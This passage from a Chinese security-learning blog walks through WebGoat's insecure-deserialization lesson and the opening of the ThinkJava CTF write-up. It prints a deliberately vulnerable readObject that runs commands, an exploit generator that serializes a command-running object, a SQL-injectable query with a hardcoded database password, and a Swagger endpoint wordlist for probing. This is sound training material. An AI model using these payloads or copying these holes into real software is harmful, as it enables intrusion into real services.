<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;

<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.InvalidClassException;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.util.Base64;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@AssignmentHints({"insecure-deserialization.hints.1", "insecure-deserialization.hints.2", "insecure-deserialization.hints.3"})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InsecureDeserializationTask</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AssignmentEndpoint</span> {

    <span class="hljs-meta">@PostMapping("/InsecureDeserialization/task")</span>
    <span class="hljs-meta">@ResponseBody</span>
    <span class="hljs-keyword">public</span> AttackResult <span class="hljs-title function_">completed</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String token)</span> <span class="hljs-keyword">throws</span> IOException {
        String b64token;
        <span class="hljs-type">long</span> before;
        <span class="hljs-type">long</span> after;
        <span class="hljs-type">int</span> delay;

        b64token = token.replace(<span class="hljs-string">'-'</span>, <span class="hljs-string">'+'</span>).replace(<span class="hljs-string">'_'</span>, <span class="hljs-string">'/'</span>);

        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(b64token)))) {
            before = System.currentTimeMillis();
            <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();
            <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> VulnerableTaskHolder)) {
                <span class="hljs-keyword">if</span> (o <span class="hljs-keyword">instanceof</span> String) {
                    <span class="hljs-keyword">return</span> failed(<span class="hljs-built_in">this</span>).feedback(<span class="hljs-string">"insecure-deserialization.stringobject"</span>).build();
                }
                <span class="hljs-keyword">return</span> failed(<span class="hljs-built_in">this</span>).feedback(<span class="hljs-string">"insecure-deserialization.wrongobject"</span>).build();
            }
            after = System.currentTimeMillis();
        } <span class="hljs-keyword">catch</span> (InvalidClassException e) {
            <span class="hljs-keyword">return</span> failed(<span class="hljs-built_in">this</span>).feedback(<span class="hljs-string">"insecure-deserialization.invalidversion"</span>).build();
        } <span class="hljs-keyword">catch</span> (IllegalArgumentException e) {
            <span class="hljs-keyword">return</span> failed(<span class="hljs-built_in">this</span>).feedback(<span class="hljs-string">"insecure-deserialization.expired"</span>).build();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">return</span> failed(<span class="hljs-built_in">this</span>).feedback(<span class="hljs-string">"insecure-deserialization.invalidversion"</span>).build();
        }

        delay = (<span class="hljs-type">int</span>) (after - before);
        System.out.println(delay);
        <span class="hljs-keyword">if</span> (delay &gt; <span class="hljs-number">7000</span>) {
            <span class="hljs-keyword">return</span> failed(<span class="hljs-built_in">this</span>).build();
        }
        <span class="hljs-keyword">if</span> (delay &lt; <span class="hljs-number">3000</span>) {
            <span class="hljs-keyword">return</span> failed(<span class="hljs-built_in">this</span>).build();
        }
        <span class="hljs-keyword">return</span> success(<span class="hljs-built_in">this</span>).build();
    }
}</code></pre>
<p>这里可以看到，程序对post传入的token进行了base64的解码，并用replace做了一定过滤，接着<code>Object o = ois.readObject();</code>送入readobject进行反序列化。如果反序列化的对象o不是VulnerableTaskHolder类的话就会抛出错误，接着最后判断delay的大小，我们需要控制在7-3秒内</p>
<p>我们转到VulnerableTaskHolder类的实现，如下列代码，</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> org.dummy.insecure.framework;

<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;

<span class="hljs-keyword">import</span> java.io.BufferedReader;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.InputStreamReader;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.Serializable;
<span class="hljs-keyword">import</span> java.time.LocalDateTime;

<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnerableTaskHolder</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {

	<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;

	<span class="hljs-keyword">private</span> String taskName;
	<span class="hljs-keyword">private</span> String taskAction;
	<span class="hljs-keyword">private</span> LocalDateTime requestedExecutionTime;
	
	<span class="hljs-keyword">public</span> <span class="hljs-title function_">VulnerableTaskHolder</span><span class="hljs-params">(String taskName, String taskAction)</span> {
		<span class="hljs-built_in">super</span>();
		<span class="hljs-built_in">this</span>.taskName = taskName;
		<span class="hljs-built_in">this</span>.taskAction = taskAction;
		<span class="hljs-built_in">this</span>.requestedExecutionTime = LocalDateTime.now();
	}
	
	<span class="hljs-meta">@Override</span>
	<span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
		<span class="hljs-keyword">return</span> <span class="hljs-string">"VulnerableTaskHolder [taskName="</span> + taskName + <span class="hljs-string">", taskAction="</span> + taskAction + <span class="hljs-string">", requestedExecutionTime="</span>
				+ requestedExecutionTime + <span class="hljs-string">"]"</span>;
	}

	<span class="hljs-comment">/**</span>
<span class="hljs-comment">	 * Execute a task when de-serializing a saved or received object.</span>
<span class="hljs-comment">	 * <span class="hljs-doctag">@author</span> stupid develop</span>
<span class="hljs-comment">	 */</span>
	<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">( ObjectInputStream stream )</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">//unserialize data so taskName and taskAction are available</span>
		stream.defaultReadObject();
		
		<span class="hljs-comment">//do something with the data</span>
		log.info(<span class="hljs-string">"restoring task: {}"</span>, taskName);
		log.info(<span class="hljs-string">"restoring time: {}"</span>, requestedExecutionTime);
		
		<span class="hljs-keyword">if</span> (requestedExecutionTime!=<span class="hljs-literal">null</span> &amp;&amp; 
				(requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(<span class="hljs-number">10</span>))
				|| requestedExecutionTime.isAfter(LocalDateTime.now()))) {
			<span class="hljs-comment">//do nothing is the time is not within 10 minutes after the object has been created</span>
			log.debug(<span class="hljs-built_in">this</span>.toString());
			<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"outdated"</span>);
		}
		
		<span class="hljs-comment">//condition is here to prevent you from destroying the goat altogether</span>
		<span class="hljs-keyword">if</span> ((taskAction.startsWith(<span class="hljs-string">"sleep"</span>)||taskAction.startsWith(<span class="hljs-string">"ping"</span>))
				&amp;&amp; taskAction.length() &lt; <span class="hljs-number">22</span>) {
		log.info(<span class="hljs-string">"about to execute: {}"</span>, taskAction);
		<span class="hljs-keyword">try</span> {
            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(taskAction);
            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(
                                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(p.getInputStream()));
            <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
            <span class="hljs-keyword">while</span> ((line = in.readLine()) != <span class="hljs-literal">null</span>) {
                log.info(line);
            }
        } <span class="hljs-keyword">catch</span> (IOException e) {
            log.error(<span class="hljs-string">"IO Exception"</span>, e);
        }
		}
       
    }
	
}</code></pre>
<p>这里代码中重写了readobject函数，并且通过条件语句限制了只能使用sleep或ping在linux与windows环境下实现延迟效果，最后通过<code>Process p = Runtime.getRuntime().exec(taskAction);</code>来触发命令执行。</p>
<p>SerializationHelper里面提供了一些工具类</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> org.owasp.webgoat.deserialization;

<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.DataOutputStream;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.io.Serializable;
<span class="hljs-keyword">import</span> java.util.Base64;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationHelper</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">char</span>[] hexArray = <span class="hljs-string">"0123456789ABCDEF"</span>.toCharArray();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">fromString</span><span class="hljs-params">(String s)</span> <span class="hljs-keyword">throws</span> IOException,
            ClassNotFoundException {
        <span class="hljs-type">byte</span>[] data = Base64.getDecoder().decode(s);
        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data));
        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();
        ois.close();
        <span class="hljs-keyword">return</span> o;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">(Serializable o)</span> <span class="hljs-keyword">throws</span> IOException {

        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);
        oos.writeObject(o);
        oos.close();
        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">show</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
        <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">dos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(baos);
        dos.writeLong(-<span class="hljs-number">8699352886133051976L</span>);
        dos.close();
        <span class="hljs-type">byte</span>[] longBytes = baos.toByteArray();
        <span class="hljs-keyword">return</span> bytesToHex(longBytes);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> {
        <span class="hljs-type">char</span>[] hexChars = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[bytes.length * <span class="hljs-number">2</span>];
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; bytes.length; j++) {
            <span class="hljs-type">int</span> <span class="hljs-variable">v</span> <span class="hljs-operator">=</span> bytes[j] &amp; <span class="hljs-number">0xFF</span>;
            hexChars[j * <span class="hljs-number">2</span>] = hexArray[v &gt;&gt;&gt; <span class="hljs-number">4</span>];
            hexChars[j * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] = hexArray[v &amp; <span class="hljs-number">0x0F</span>];
        }
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(hexChars);
    }

}</code></pre>
<p>接下来就是构造反序列化的payload，我们在webgoat源码中VulnerableTaskHolder所在的目录下新建一个java类，其中的内容写我们需要的恶意代码，如下图所示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211195833454.png" alt="image-20231211195833454"></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> org.dummy.insecure.framework;

<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.util.Base64;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerialMain</span> {

    <span class="hljs-keyword">static</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>{
        <span class="hljs-keyword">try</span>{
            <span class="hljs-comment">//向VulnerableTaskHolder类传入ping命令</span>
            <span class="hljs-type">VulnerableTaskHolder</span> <span class="hljs-variable">go</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VulnerableTaskHolder</span>(<span class="hljs-string">"ping"</span>, <span class="hljs-string">"ping -n 6 127.0.0.1"</span>);
            <span class="hljs-comment">//创建一个 ByteArrayOutputStream 对象，用于存储序列化后的字节数据。</span>
            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
            <span class="hljs-comment">//创建一个 ObjectOutputStream 对象，用于将对象序列化到 ByteArrayOutputStream</span>
            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);
            <span class="hljs-comment">//进行反序列化</span>
            oos.writeObject(go);
            <span class="hljs-comment">//刷新 ObjectOutputStream，确保所有数据都被写入到 ByteArrayOutputStream。</span>
            oos.flush();
            <span class="hljs-comment">//获取 ByteArrayOutputStream 中的字节数组。</span>
            <span class="hljs-type">byte</span>[] exploit = bos.toByteArray();
            <span class="hljs-comment">//将字节数组进行 Base64 编码，得到一个 Base64 编码的字符串。</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(exploit);
            System.out.println(exp);
        } <span class="hljs-keyword">catch</span> (Exception e){

        }
    }
}</code></pre>
<p>代码内容如上图，执行SerialMain后生成token，复制到token处提交。 从console可以看到执行了ping命令，且task任务的响应也会变慢。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211200010775.png" alt="image-20231211200010775"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211200140562.png" alt="image-20231211200140562"></p>
<p>如上图成功通过，然后我在解决上述问题的时候突然看到这个webgoat的版本适配的是jdk15，然后我就下载了15的来重新运行webgoat，随后又尝试弹calc，tmd竟然成了！！！—这感觉就是纯纯jdk版本适配问题啊。。。。。。。。。。。还有一点，我在使用bp的collaborator时，一直连接不上去，翻了多个文章发现是校园网的问题。。。。。无语住了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211200442072.png" alt="image-20231211200442072"></p>
<h2 id="83-serializationdumper-数据分析">8.3 SerializationDumper 数据分析</h2>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/NickstaDB/SerializationDumper">https://github.com/NickstaDB/SerializationDumper</a></p>
<p>这个可以用来进行Java反序列化1payload之类的数据分析</p>
<pre><code class="hljs java">java -jar SerializationDumper-v1<span class="hljs-number">.13</span>.jar -r <span class="hljs-number">1.</span>bin &gt; <span class="hljs-number">1.</span>txt</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211201259207.png" alt="image-20231211201259207"></p>
<p>如图所示，可以较为清楚的展示Java反序列化1数据</p>
<h2 id="84-网鼎杯-2020-朱雀组thinkjava">8.4 [网鼎杯 2020 朱雀组]ThinkJava</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211201615097.png" alt="image-20231211201615097"></p>
<p>访问首页说没有身份权限，那估计需要先root一下，这里先看题目给的附件</p>
<pre><code class="hljs java"><span class="hljs-comment">//</span>
<span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span>
<span class="hljs-comment">// (powered by FernFlower decompiler)</span>
<span class="hljs-comment">//</span>

<span class="hljs-keyword">package</span> cn.abc.core.controller;

<span class="hljs-keyword">import</span> cn.abc.common.bean.ResponseCode;
<span class="hljs-keyword">import</span> cn.abc.common.bean.ResponseResult;
<span class="hljs-keyword">import</span> cn.abc.common.security.annotation.Access;
<span class="hljs-keyword">import</span> cn.abc.core.sqldict.SqlDict;
<span class="hljs-keyword">import</span> cn.abc.core.sqldict.Table;
<span class="hljs-keyword">import</span> io.swagger.annotations.ApiOperation;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.CrossOrigin;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;

<span class="hljs-meta">@CrossOrigin</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping({"/common/test"})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span> {
    }

    <span class="hljs-meta">@PostMapping({"/sqlDict"})</span>
    <span class="hljs-meta">@Access</span>
    <span class="hljs-meta">@ApiOperation("为了开发方便对应数据库字典查询")</span>
    <span class="hljs-keyword">public</span> ResponseResult <span class="hljs-title function_">sqlDict</span><span class="hljs-params">(String dbName)</span> <span class="hljs-keyword">throws</span> IOException {
        List&lt;Table&gt; tables = SqlDict.getTableData(dbName, <span class="hljs-string">"root"</span>, <span class="hljs-string">"abc@12345"</span>);
        <span class="hljs-keyword">return</span> ResponseResult.e(ResponseCode.OK, tables);
    }
}</code></pre>
<p>这里给了一个<code>/common/test</code>接口，其中会访问sqlDict接口，接着传入了数据库的账号和密码，我们转到sqlDict看看</p>
<pre><code class="hljs java"><span class="hljs-comment">//</span>
<span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span>
<span class="hljs-comment">// (powered by FernFlower decompiler)</span>
<span class="hljs-comment">//</span>

<span class="hljs-keyword">package</span> cn.abc.core.sqldict;

<span class="hljs-keyword">import</span> java.sql.Connection;
<span class="hljs-keyword">import</span> java.sql.DatabaseMetaData;
<span class="hljs-keyword">import</span> java.sql.DriverManager;
<span class="hljs-keyword">import</span> java.sql.ResultSet;
<span class="hljs-keyword">import</span> java.sql.SQLException;
<span class="hljs-keyword">import</span> java.sql.Statement;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlDict</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SqlDict</span><span class="hljs-params">()</span> {
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbName, String user, String pass)</span> {
        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">try</span> {
            Class.forName(<span class="hljs-string">"com.mysql.jdbc.Driver"</span>);
            <span class="hljs-keyword">if</span> (dbName != <span class="hljs-literal">null</span> &amp;&amp; !dbName.equals(<span class="hljs-string">""</span>)) {
                dbName = <span class="hljs-string">"jdbc:mysql://mysqldbserver:3306/"</span> + dbName;
            } <span class="hljs-keyword">else</span> {
                dbName = <span class="hljs-string">"jdbc:mysql://mysqldbserver:3306/myapp"</span>;
            }

            <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span> || dbName.equals(<span class="hljs-string">""</span>)) {
                user = <span class="hljs-string">"root"</span>;
            }

            <span class="hljs-keyword">if</span> (pass == <span class="hljs-literal">null</span> || dbName.equals(<span class="hljs-string">""</span>)) {
                pass = <span class="hljs-string">"abc@12345"</span>;
            }

            conn = DriverManager.getConnection(dbName, user, pass);
        } <span class="hljs-keyword">catch</span> (ClassNotFoundException var5) {
            var5.printStackTrace();
        } <span class="hljs-keyword">catch</span> (SQLException var6) {
            var6.printStackTrace();
        }

        <span class="hljs-keyword">return</span> conn;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Table&gt; <span class="hljs-title function_">getTableData</span><span class="hljs-params">(String dbName, String user, String pass)</span> {
        List&lt;Table&gt; Tables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();
        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> getConnection(dbName, user, pass);
        <span class="hljs-type">String</span> <span class="hljs-variable">TableName</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();
            <span class="hljs-type">DatabaseMetaData</span> <span class="hljs-variable">metaData</span> <span class="hljs-operator">=</span> conn.getMetaData();
            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">tableNames</span> <span class="hljs-operator">=</span> metaData.getTables((String)<span class="hljs-literal">null</span>, (String)<span class="hljs-literal">null</span>, (String)<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]{<span class="hljs-string">"TABLE"</span>});

            <span class="hljs-keyword">while</span>(tableNames.next()) {
                TableName = tableNames.getString(<span class="hljs-number">3</span>);
                <span class="hljs-type">Table</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Table</span>();
                <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '"</span> + dbName + <span class="hljs-string">"' and table_name='"</span> + TableName + <span class="hljs-string">"';"</span>;
                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql);

                <span class="hljs-keyword">while</span>(rs.next()) {
                    table.setTableDescribe(rs.getString(<span class="hljs-string">"TABLE_COMMENT"</span>));
                }

                table.setTableName(TableName);
                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="hljs-literal">null</span>, TableName, <span class="hljs-string">""</span>);
                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs2</span> <span class="hljs-operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="hljs-literal">null</span>, TableName);

                String PK;
                <span class="hljs-keyword">for</span>(PK = <span class="hljs-string">""</span>; rs2.next(); PK = rs2.getString(<span class="hljs-number">4</span>)) {
                }

                <span class="hljs-keyword">while</span>(data.next()) {
                    <span class="hljs-type">Row</span> <span class="hljs-variable">row</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Row</span>(data.getString(<span class="hljs-string">"COLUMN_NAME"</span>), data.getString(<span class="hljs-string">"TYPE_NAME"</span>), data.getString(<span class="hljs-string">"COLUMN_DEF"</span>), data.getString(<span class="hljs-string">"NULLABLE"</span>).equals(<span class="hljs-string">"1"</span>) ? <span class="hljs-string">"YES"</span> : <span class="hljs-string">"NO"</span>, data.getString(<span class="hljs-string">"IS_AUTOINCREMENT"</span>), data.getString(<span class="hljs-string">"REMARKS"</span>), data.getString(<span class="hljs-string">"COLUMN_NAME"</span>).equals(PK) ? <span class="hljs-string">"true"</span> : <span class="hljs-literal">null</span>, data.getString(<span class="hljs-string">"COLUMN_SIZE"</span>));
                    table.list.add(row);
                }

                Tables.add(table);
            }
        } <span class="hljs-keyword">catch</span> (SQLException var16) {
            var16.printStackTrace();
        }

        <span class="hljs-keyword">return</span> Tables;
    }
}</code></pre>
<p>这里看到<code>getTableData</code>用来查询数据库数据，其中sql语句没做过滤，存在sql注入，但我们在test中会看到如下图，导入的包中含有swagger</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211202529395.png" alt="image-20231211202529395"></p>
<p>我们百度查一下相关资料：</p>
<pre><code class="hljs plaintext">Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务，JAVA在金融机构开发语言的地位一直居高不下，而作为JAVA届服务端的大一统框架Spring，便将Swagger规范纳入自身的标准，建立了Spring-swagger项目，所以在实际测试环境中，基于spring框架的swagger-ui接口展示及调试文档页面最为常见。</code></pre>
<p>这里我们搜的时候会发现他会提示有个swagger-ui漏洞，那我们继续了解一下会发现这玩意儿存在未授权访问漏洞</p>
<pre><code class="hljs plaintext">/api
/api-docs
/api-docs/swagger.json
/api.html
/api/api-docs
/api/apidocs
/api/doc
/api/swagger
/api/swagger-ui
/api/swagger-ui.html
/api/swagger-ui.html/
/api/swagger-ui.json
/api/swagger.json
/api/swagger/
/api/swagger/ui
/api/swagger/ui/
/api/swaggerui
/api/swaggerui/
/api/v1/
/api/v1/api-docs
/api/v1/apidocs
/api/v1/swagger
/api/v1/swagger-ui
/api/v1/swagger-ui.html
/api/v1/swagger-ui.json
/api/v1/swagger.json
/api/v1/swagger/
/api/v2
/api/v2/api-docs
/api/v2/apidocs
/api/v2/swagger
/api/v2/swagger-ui
/api/v2/swagger-ui.html
/api/v2/swagger-ui.json
/api/v2/swagger.json
/api/v2/swagger/
/api/v3
/apidocs
/apidocs/swagger.json
/doc.html
/docs/
/druid/index.html
/graphql
/libs/swaggerui
/libs/swaggerui/
/spring-security-oauth-resource/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/sw/swagger-ui.html
/swagger
/swagger-resources
/swagger-resources/configuration/security
/swagger-resources/configuration/security/
/swagger-resources/configuration/ui
/swagger-resources/configuration/ui/
/swagger-ui
/swagger-ui.html
/swagger-ui.html#/api-memory-controller
/swagger-ui.html/
/swagger-ui.json
/swagger-ui/swagger.json
/swagger.json
/swagger.yml
/swagger/
/swagger/index.html
/swagger/static/index.html
/swagger/swagger-ui.html
/swagger/ui/
/Swagger/ui/index
/swagger/ui/index
/swagger/v1/swagger.json
/swagger/v2/swagger.json
/template/swagger-ui.html
/user/swagger-ui.html
/user/swagger-ui.html/
/v1.x/swagger-ui.html
/v1/api-docs
/v1/swagger.json
/v2/api-docs
/v3/api-docs</code></pre>
<p>这里也是看了wp要访问swagger-ui.html页面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211203236850.png" alt="image-20231211203236850"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211203330036.png" alt="image-20231211203330036"></p>
<p>查看一番发现其有三个接口，对应着题目附件中源码中的java文件，我们可以现在dbName处进行sql注入拿到账号密码</p>
<p>不过这里涉及到了jdbc的sql注入，这里先跟着浅学一下，一会儿深入，我们定位到下图</p>
